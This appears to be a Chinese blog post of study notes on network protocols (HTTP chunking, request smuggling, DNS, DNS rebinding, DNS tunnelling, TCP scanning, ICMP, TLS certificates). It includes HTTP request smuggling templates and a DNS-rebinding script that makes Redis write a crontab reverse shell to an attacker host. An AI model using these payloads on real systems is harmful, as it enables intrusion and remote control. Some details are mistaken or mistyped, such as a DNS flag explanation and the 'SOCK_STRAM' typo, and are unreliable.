---
title: 协议学习笔记（1）：HTTP、DNS、TCP/IP 与 HTTPS
date: 2026-10-10 17:00:00
categories:
  - 网络基础
tags:
  - HTTP
  - DNS
  - TCP
  - ICMP
  - HTTPS
  - 请求走私
  - DNS重绑定

---

## OSI 七层 / TCP/IP 四层：
### HTTP/1.1 协议深度：
Header:

Host：这里会出现IP或域名，相当于在网络上的地址。

Connection：keep-alive 或 close，客户端和服务端的连接状态

Transfer-Encoding：常见是chunked，保持连接时，数据传输的方式，方便判断数据的开始和结束。

Content-Type：这是最好理解的，内容最原始的数据类型。

Cookie：由服务器响应中Set-Cookie返回的一些值，是重要信息。

Authorization：客户端与服务端传递认证凭证用的，用户名和密码，或者是令牌。

#### 手搓chunked来理解http
 协议规定 Chunked Body 的每个分块开头必须用十六进制来便是长度，为了压缩提效

根据chunked的规矩，每段属性、数据结束后都要加\r\n来隔离

```python
import socket

host = "goal.com"
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

## Chunked 协议下绝不能带有 Content-Length 头
headers = (
    "POST /post HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: text/plain\r\n"
    "\r\n"
)

## Chunked Body
chunk1_data = "Hello"
chunk1 = f"{len(chunk1_data):x}\r\n{chunk1_data}\r\n"

chunk2_data = "World"
chunk2 = f"{len(chunk2_data):x}\r\n{chunk2_data}\r\n"

end_chunk = "0\r\n\r\n"

payload = headers + chunk1 + chunk2 + end_chunk

print("--- 发送的原始数据流 ---")
print(payload.replace("\r\n", "\\r\\n\n")) # 可视化 CRLF

## 发送并接收响应
s.sendall(payload.encode("utf-8"))
response = b""  # 这个b原来只是字节
while True:
    data = s.recv(4096)
    if not data:
        break
    response += data

print("--- 服务器响应 ---")
print(response.decode("utf-8"))
s.close()
```

#### HTTPS的SSL/TLS加密
![](/img/posts/protocols-1/protocols-1-01.png)

![](/img/posts/protocols-1/protocols-1-02.png)

info：能看到Client Hello 客户端发起加密

你们包括可选择的加密算法

![](/img/posts/protocols-1/protocols-1-03.png)

info看到 Server Hello 服务器有选择的加密算法和CA证书

加密密钥有服务端发放，bp之所以能获取加密信息，是因为它做了两次中间人，一次给客户端截信息然后发送密钥，然后给服务端发送截取的信息，得到服务器的正确密钥。

#### 进阶：http请求走私
前置代理和后端服务器对同一请求的边界解析不一致导致的

例如同时发送了 Content-Length (CL) 和 Transfer-Encoding: chunked (TE)

第一种：前端看CL，后端看TE

```http
POSt / HTTP/1/1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

0

POST /attack HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5c
```

前端只看CL，长度是49，传输是连带着下面的POST请求一起，刚好49个字节。后端看TE，结果直接看到了0\r\n\r\n 结束块，下面的POST请求被丢弃在TCP缓冲区队列里，等待下一个请求。

```http
GET /profile HTTP/1.1
Host: target.com
Cookie: session=User_Perfect_Secret_Cookie
```

如果下一个请求带有认证凭证，就可以通过访问 /attack 有问题的路由导致一些信息泄露，比如/attack是一个发表评论的接口，那么下一个请求会被当成内容被公布在留言板上。

第二种：前端看TE，后端看CL

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /attack HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0
```

前端的TE，长度是5c，包含内容到0，后端看CL，内容到5c，同样是留了一个POST请求在TCP缓冲区队列里，等待下一个请求。攻击手法类似。

#### 用python写一个请求接收
```python
import socket

def start_server():
    # 声明一个使用IPv4 和 TCP 的 Socket 插座
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 允许程序断开后立刻重新绑定端口，防止出现 "Address already in use" 报错
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server_socket.bind(('0.0.0.0', 8080))

    server_socket.listen(5)
    print("HTTP服务已启动，正在监听 http://0.0.0.0:8080")

    while True:
        # accept阶段
        client_socket, client_address = server_socket.accept()
        print(f"收到来自{client_address}的浏览器连接")

        request_data = client_socket.recv(2048).decode("utf-8")

        print("--- 浏览器发来的原始请求头 ---")
        print(request_data)
        print("----------------------------")

        # HTML页面的内容
        html_body = """
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>r1d3r的底层服务器</title>
                    <style>
                        body { font-family: sans-serif; text-align: center; margin-top: 100px; background: #f0f2f5; }
                        h1 { color: #1890ff; }
                        .box { background: white; padding: 20px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
                    </style>
                </head>
                <body>
                    <div class="box">
                        <h1>🎉 恭喜！你的手工 HTTP 服务器成功运行！</h1>
                        <p>这是一个纯 Socket 驱动的底层响应。</p>
                    </div>
                </body>
                </html>
                """

        # response 报文
        response_headers = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(html_body.encode('utf-8'))}\r\n"
            "Connection: close\r\n"
            "\r\n"
        )

        # 完整的报文
        full_response = response_headers + html_body
        client_socket.sendall(full_response.encode("utf-8"))

        # 结束连接
        client_socket.close()

if __name__ == "__main__":
    start_server()
```

服务端接收数据的生命周期：

socket创建 -> bind 绑定端口 -> listen 监听 -> accept 阻塞 -> recv 读数据 -> send 回包 -> close 断开

#### CRLR注入
规定是这样的：

每一个 Header 占据一行，末尾必须用一个 \r\n 结尾

Header 区域与下面的 Body（网页内容）区域之间，必须用一个连续的双 \r\n\r\n（即一个空行）隔开。

一种：有URL重定向功能

### DNS:
#### 流量分析：
请求：

![](/img/posts/protocols-1/protocols-1-04.png)

 Transaction ID：请求和响应对应

Flags：0x0100 Standard query：自动请求到根服务器

Flags: 0x8180 Standard query response, No error：错误，域名不存在或者服务器拒绝回答

Questions：1，查询一个域名

Name：查询的域名

Type：A（IP v4）AAAA（IP v6）

响应：

![](/img/posts/protocols-1/protocols-1-05.png)

Answer RRs：1，查到一个域名

Address：查到的IP

TTL（Time to live）：查询记录在本地的缓存时间

#### DNS查询细节：
两个机制：

1.递归查询：客户端 -> 本地DNS服务器，只管发送地址，等结果，本地DNS跑腿

2.迭代查询：本地DNS服务器 -> 各级根/TLD/权威DNS，本地依次询问，这不行下一层，知道出结果

dig + trace 模拟：

![](/img/posts/protocols-1/protocols-1-06.png)

先问了我本地的DNS服务器 114.114.114.114:53，得到了13台根域名服务器，然后将这个服务器名单发给本地DNS

![](/img/posts/protocols-1/protocols-1-07.png)

问了 e.root-servers.net ，返回了.com的13个顶级域名服务器

![](/img/posts/protocols-1/protocols-1-08.png)

 k.gtld-servers.net这台顶级域名服务器返回了5个权威DNS服务器

![](/img/posts/protocols-1/protocols-1-09.png)

权威服务器返回了4个IP

#### 传统DNS重绑定：
##### 原理
浏览器的同源策略（SOP），协议和域名相同算同源，同源之间的文件可以相互请求，这里用户访问一个域名网址，浏览器需要将与域名有关的一些文件下载到内存缓存中，如 js 文件。

TTL修改为0，查询刚记录好就过期，过期时记录的是原本的黑客公网IP，之后黑客将该域名和127.0.0.1绑定，用户这个时候下载在缓存的js文件中有fetch等情求同源，这会儿就会请求到127.0.0.1，也就是用户自己的电脑。

##### 三个攻击方式：
1.本地Redis：默认监听 6379 端口，让 attacker.com 重新绑定到 127.0.0.1:6379，通过请求中的payload的执行RCE，不过现在的浏览器有黑名单，不准请求 6379端口

```javascript
// 假设黑客的监听服务器
const HACKER_IP = "0.0.0.0";
const HACKER_PORT = "9999";

// 构造标准的 Redis 协议命令文本
// \r\n 是为了让 Redis 认为这是一条独立指令的结束
const redisCommands = [
    "flushall",                                                                            // 1. 清空当前数据库
    `set backup "\n\n* * * * * /bin/bash -i >& /dev/tcp/${HACKER_IP}/${HACKER_PORT} 0>&1\n\n"`, // 2. 写入每分钟执行一次的反弹 Shell 任务
    "config set dir /var/spool/cron/",                                                     // 3. 将切换工作目录到系统的定时任务目录
    "config set dbfilename root",                                                          // 4. 将保存的文件名设为 root 用户的 crontab 文件
    "save",                                                                                // 5. 强行将内存数据写入磁盘文件
    "quit"                                                                                 // 6. 退出连接
].join("\r\n") + "\r\n";

async function attackRedis() {
    console.log("正在通过已重绑定的域名向本地 Redis (6379) 走私命令...");
    
    try {
        // 注意：由于浏览器限制，fetch 无法直接访问非标准端口（Chrome 默认封禁了 6379 端口）
        // 在实际安全研究中，黑客通常需要借由受害者浏览器未禁用的端口，或者在旧版本浏览器、或者使用特定的 XMLHttpRequest 漏洞
        // 这里以标准异步请求为例，展示流量走私的形态：
        
        await fetch('http://attacker.com:6379/', { // 此时 attacker.com 已解析为 127.0.0.1
            method: 'POST',
            mode: 'no-cors', // 允许发送跨域请求，忽略 CORS 报错
            headers: {
                'Content-Type': 'text/plain'
            },
            body: redisCommands // 将 Redis 命令作为 HTTP 请求体发送
        });
        
        console.log("Payload 已成功发出！请检查公网监听控制台。");
    } catch (err) {
        console.error("发送失败:", err);
    }
}
attackRedis();
```

2.本地 Docker 守护进程 API：默认监听 2375 端口，可以通过这个端口重新挂一个容器。

3.其他开放端口。

#### DNS隧道：
##### 原理：
因为内网机器被限制出网，那要传递信息怎么办，就是通过DNS协议，从本地DNS到外网的根/权威等，将数据塞在DNS请求报文中（TXT、A、CNAME等），www.baidu.com，baidu.com是权威域名，www在权威域名服务器里被当作查询数据，www可以改为有效内容。

![](/img/posts/protocols-1/protocols-1-10.png)

##### 利用：
dnscat2连接内网和攻击机，中间是通过DNS嵌套TCP来传信息，发挥命令执行作用的是内网机器的 dnscat2 客户端，客户端进入进程执行命令

### TCP/IP：
TCP的三次握手：

![](/img/posts/protocols-1/protocols-1-11.png)

双向通信能力的最小次数为3

四次挥手

![](/img/posts/protocols-1/protocols-1-12.png)

记得话还是有规律的，SYN 和 FIN 分别是握手和挥手的开端，ACK是回应

#### 手搓TCP端口扫描：
全连接扫描的本质是完整地走一遍三次握手，成功建立表示端口开放

```python
import socket
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

## 线程锁，防止多线程打印导致控制台字符错乱
print_lock = threading.Lock()

def tcp_connect_scan(target_ip,port,timeout=2.0):
    s = socket.socket(socket.AF_INET,socket.SOCK_STRAM)
    s.settimeout(timeout)
    status = "unknown"
    try:
        # 尝试建立完整的三次握手
        s.connect((target_ip,port))
        # 如果没有抛出异常，说明三次握手成功，端口开放
        status = "open"
    except socket.timeout:
        status = "filtered"
    except socket.error as e:
        # Windows 常见的错误码: 
        # 10061 (WSAECONNREFUSED) -> 目标主机主动拒绝
        # 10060 (WSAETIMEDOUT) -> 也有可能在底层表现为系统超时
        err_code = e.errno if e.errno else (e.args[0] if isinstance(e.args,tuple) else None)
        if err_code == 10061 or "refused" in str(e).lower():
            status = "closed"
        elif err_code == 10060 or "timed out" in str(e).lower():
            status = "filtered"
        else:
            status = "closed"
    finally:
        s.close()
        # 打印扫描结果
    with print_lock:
        if status == "open":
            print(f"[+] Port {port:<5} : \033[1;32m{status:<8}\033[0m (三次握手成功)")
        elif status == "closed":
            print(f"[-] Port {port:<5} : \033[1;31m{status:<8}\033[0m (收到 RST 拒绝)")
        else:
            print(f"[!] Port {port:<5} : \033[1;33m{status:<8}\033[0m (无响应/被防火墙拦截)")

def main():
    target_host = "127.0.0.1"

    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        print(f"[-] 无法解析主机名: {target_host}")
        sys.exit(1)
        
    print("-" * 50)
    print(f"开始扫描目标: {target_host} ({target_ip})")
    print("扫描模式: TCP 全连接扫描 (Connect Scan)")
    print("-" * 50)

    # 定义需要测试的端口范围（例如常见服务端口）
    ports_to_scan = [21, 22, 23, 80, 135, 443, 445, 1433, 3306, 3389, 8000, 8080]
    
    # 使用线程池并发执行，大幅提升 Windows 上的扫描速度
    with ThreadPoolExecutor(max_workers=10) as executor:
        for port in ports_to_scan:
            executor.submit(tcp_connect_scan, target_ip, port)

if __name__ == "__main__":
    main()
```

会出现的三种状态：

1.open：三次握手成功，端口开放

2.closed：端口未开放，操作系统底层网络栈自动回复 RST 报文，连接断开

3.filtered：部署防火墙了，直接给 SYN 丢弃了，迟迟无回应，timeout

#### ICMP协议：
ICMP报文是直接封装在 IP 数据报文内部的，用于检测网络通不通（通常称为ping包）

![](/img/posts/protocols-1/protocols-1-13.png)

抓的流量包看，IPv4的data字段中 Protocol：ICMP（1）表示这个后面跟着一个ICMP报文

![](/img/posts/protocols-1/protocols-1-14.png)

ICMP报文，Type：8 这是一个ping请求

![](/img/posts/protocols-1/protocols-1-15.png)

![](/img/posts/protocols-1/protocols-1-16.png)

reply，Type：0 返回一个响应包

##### 手搓ICMP：
```python
from scapy.all import IP, ICMP, sr1

## 1. 手工构造网络层 (网络层 - IP)
## dst 代表目标 IP 地址，这里以常用的公共 DNS 114.114.114.114 为例
## ttl (Time to Live) 设为 64，表示该数据包最多允许经过 64 个路由器
ip_layer = IP(dst="114.114.114.114", ttl=64)

## 2. 手工构造 ICMP 层 (ICMP 协议)
## type=8 代表这是一个 Echo Request (请求包)
## code=0 是 Echo Request 的标准代码
## id 和 seq 是用来标识和配对该请求的自定义标识符
icmp_layer = ICMP(type=8, code=0, id=1234, seq=1)

payload = "Hello Network Security!"
## 3. 协议栈大套娃：使用 '/' 符号按层组装数据包
## 逻辑：将 ICMP 层作为 IP 层的 Payload，将文本作为 ICMP 层的 Payload
ping_packet = ip_layer / icmp_layer / payload
print("--- 正在发送手工构造的 ICMP 报文 ---")
## 展示我们手工拼装出来的完整报文结构
ping_packet.show()

print("\n正在等待目标主机的响应 (Echo Reply)...")
## sr1 代表 Send and Receive 1: 发送该数据包，并只接收第一个返回的响应包
reply_packet = sr1(ping_packet, timeout=2, verbose=False)

print("\n--- 收到响应报文 ---")
if reply_packet:
    # 打印返回包的细节
    reply_packet.show()
    print("\n[结果]: 成功收到 114.114.114.114 的回应！目标主机存活。")
else:
    print("\n[结果]: 请求超时，未收到回应。")
```

#### traceroute
##### 原理：
手搓的时候一般设置 ttl = 64，ttl的设计初衷是防止数据包在网络中卡死，数据包没经过一个路由器，ttl 就减1，减到0就丢弃，然后返回一个ICMP 超时的报错包，并告诉主机这个包在哪个 IP 死亡

ttl 从1 开始每次加 1 ，就能知道到终点时经过的所有路由器 IP

Windows（tracert）与 Linux（traceroute）的重要区别：

Windows (tracert)：默认发送的是 ICMP Echo Request（Ping包），终点收到后会返回 ICMP Echo Reply。

Linux (traceroute)：默认发送的是 UDP 报文（目标端口是一个大于 30000 的高位随机端口）。由于终点并没有开启这个随机端口的服务，所以终点会返回一个 ICMP Port Unreachable（端口不可达） 报文。通过这种特异性的回包，Linux 就能判断出“包已经安全抵达终点”。

### HTTPS:
#### 证书怎么看：
![](/img/posts/protocols-1/protocols-1-17.png)

这是一份证书：

s: 是使用者，i: 是颁发者

可以看到这份的使用者是baidu.com，颁发者这是GlobalSign RSA OV SSL CA 2018

自签名证书：就是使用者和颁发者一样

v: 是证书的有效时间

SAN 扩展：多个域名绑定一个证书，

![](/img/posts/protocols-1/protocols-1-18.png)

双方使用 TLS 1.2协议建立的加密通道，加密算法是 ECDHE-RSA-AES128-GCM-SHA256
